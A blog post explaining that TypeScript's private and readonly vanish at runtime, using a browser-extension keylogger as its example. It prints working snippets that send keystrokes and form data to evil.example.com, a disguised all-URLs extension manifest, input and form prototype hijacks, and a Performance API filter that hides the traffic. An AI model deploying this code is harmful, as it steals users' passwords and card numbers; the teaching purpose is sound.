# A Keylogger in 4 Lines: The JavaScript Runtime Truth That TypeScript Can't Save You From

Here is a keylogger:

```javascript
document.addEventListener("keydown", (e) => {
  navigator.sendBeacon("https://evil.example.com/log", JSON.stringify({
    key: e.key, url: location.href, time: Date.now()
  }));
});
```

Four lines. Every keystroke on the page — passwords, credit card numbers, private messages — silently exfiltrated to a remote server. No import statements. No build step. No dependencies. Just JavaScript doing exactly what JavaScript was designed to do.

Now wrap it in a browser extension:

```json
{
  "manifest_version": 3,
  "name": "Helpful Toolbar Helper",
  "version": "1.0",
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"]
  }]
}
```

That `content.js` file is the four lines above. The extension installs in one click, runs on every page the user visits, and has full access to the DOM. The user sees "Helpful Toolbar Helper" and thinks nothing of it.

This isn't a theoretical exploit. Keylogger extensions have been found in the Chrome Web Store — one discovered in 2017 had over a million installs before removal. The question isn't whether this is possible. The question is **why**.

---

## "But My App Is Written in TypeScript"

If you're a developer reading this and thinking "my application is safe because we use TypeScript with strict mode," let me show you something.

Here is your secure login form component:

```typescript
class LoginForm {
  private password: string = "";
  readonly maxAttempts: number = 3;
  private attempts: number = 0;

  setPassword(value: string): void {
    this.password = value;
  }

  submit(): boolean {
    if (this.attempts >= this.maxAttempts) {
      throw new Error("Account locked");
    }
    this.attempts++;
    return authenticate(this.password);
  }
}
```

`private`. `readonly`. Strict types. This looks airtight. And the TypeScript compiler will enforce every one of those constraints — at *compile time*.

Here is what actually ships to the browser:

```javascript
class LoginForm {
  constructor() {
    this.password = "";
    this.maxAttempts = 3;
    this.attempts = 0;
  }
  setPassword(value) {
    this.password = value;
  }
  submit() {
    if (this.attempts >= this.maxAttempts) {
      throw new Error("Account locked");
    }
    this.attempts++;
    return authenticate(this.password);
  }
}
```

`private` — gone. `readonly` — gone. Type annotations — gone. What remains is a standard JavaScript constructor function with methods on its prototype. Every property is publicly accessible. Every method is replaceable.

The extension's content script runs in the same page context. It doesn't need to know your TypeScript types. It doesn't need to break your encapsulation. **There is no encapsulation.** There is only JavaScript.

---

## Why JavaScript Lets This Happen

This isn't a flaw in a specific browser API. It's a property of the language itself.

### There Are No Classes

Run `node demo.js` in this repo. You'll see the proof. When you write this:

```javascript
class User {
  constructor(name) { this.name = name; }
  sayHello() { console.log(`Hello, ${this.name}`); }
}
```

The JavaScript engine creates a constructor function and attaches `sayHello` to `User.prototype`. The `class` keyword is syntactic sugar — it doesn't create a sealed blueprint, a protected boundary, or an access-controlled structure. It creates a function and a shared object.

```javascript
typeof User === "function"                             // true
new User("Alice").hasOwnProperty("sayHello")           // false — not on the instance
Object.getPrototypeOf(new User("Alice")) === User.prototype  // true — it's on the prototype
```

There is no class. There is a function and a mutable object in a delegation chain.

### Everything Is a Mutable Object

Every browser API your application relies on — `document`, `window`, `fetch`, `addEventListener` — is a property on a mutable object. Methods live on mutable prototypes. There is no `final`, no `sealed`, no runtime access modifier in JavaScript.

A keylogger doesn't need to hack anything. It just *uses the language*:

```javascript
// Intercept every input field's value property
const descriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
Object.defineProperty(HTMLInputElement.prototype, 'value', {
  set(val) {
    console.log('Input value set to:', val);
    descriptor.set.call(this, val);
  },
  get() {
    return descriptor.get.call(this);
  }
});
```

This isn't hooking into some obscure debug API. `Object.defineProperty` is a standard language feature. `HTMLInputElement.prototype` is a mutable object. The property descriptor is replaceable. And now every `<input>` element on the page — including the password field your TypeScript component renders — has its `value` setter hijacked.

### The Prototype Chain Is Writable

Because methods live on prototypes (not on instances), modifying a prototype affects *every* instance that delegates to it. Past, present, and future.

```javascript
// Capture every form submission on the page
const original = HTMLFormElement.prototype.submit;
HTMLFormElement.prototype.submit = function() {
  const data = new FormData(this);
  navigator.sendBeacon("https://evil.example.com/forms", 
    JSON.stringify(Object.fromEntries(data))
  );
  return original.call(this);
};
```

One prototype mutation intercepts every form on the page. The application code calls `form.submit()` like it always did. It has no way of knowing the method it's calling has been replaced — because there's no sealed class boundary to violate. The prototype is just an object, and objects are mutable.

### Shape Over Identity

In Java or C#, you can't pass a fake `HttpRequest` where a real one is expected. The type system uses **nominal typing** — identity matters.

JavaScript doesn't have that. TypeScript mirrors this with **structural typing**: if the shape matches, it passes. At runtime, there's nothing checking identity at all.

```javascript
// Replace the Performance API to hide malicious network activity
const fakeEntries = performance.getEntriesByType;
performance.getEntriesByType = function(type) {
  return fakeEntries.call(this, type).filter(
    entry => !entry.name.includes("evil.example.com")
  );
};
```

The keylogger hides its own network traces by wrapping the Performance API with a filtered version. The object has the same shape. Nothing in the runtime knows or cares that it was replaced.

---

## The Full Picture

Here is what a keylogger extension actually does, and which JavaScript property enables each step:

| What the Extension Does | Why JavaScript Allows It |
|---|---|
| Listens to every keystroke via `document.addEventListener` | The DOM is a mutable object graph |
| Reads input field values via prototype interception | `HTMLInputElement.prototype` is writable |
| Intercepts form submissions | `HTMLFormElement.prototype.submit` is replaceable |
| Exfiltrates data with `navigator.sendBeacon` | Browser APIs are just object properties |
| Hides its own traces from Performance API | Any object can be wrapped with a same-shape substitute |
| Runs on every page via `content_scripts` | Content scripts share the page's JS context |

Every capability traces back to the same root: **JavaScript is a prototype-based language with mutable objects, no runtime encapsulation, and no nominal type checking.** TypeScript adds a compile-time layer on top, but that layer is removed before a single line of code executes in the browser.

The browser's security model — same-origin policy, Content Security Policy, extension permissions — exists precisely because the language itself has none of these protections. The guardrails are in the platform, not the runtime.

---

## Know Your Runtime

This isn't an argument against TypeScript. TypeScript is a phenomenal tool for catching bugs at compile time, improving code documentation, and enabling refactoring at scale. Use it.

But don't confuse compile-time checking with runtime safety. `private` is a linter rule, not a lock. `readonly` is a suggestion that disappears. `class` is a costume over a prototype chain.

If you want to understand why browser extensions are so powerful, why the web is so extensible, why a few lines of JavaScript can capture every keystroke on a page — you need to understand what your code *actually is* after the TypeScript compiler finishes with it.

It's objects. It's prototypes. It's mutable all the way down.

**The bouncer goes home at compile time. What happens at runtime is between you and the prototype chain.**
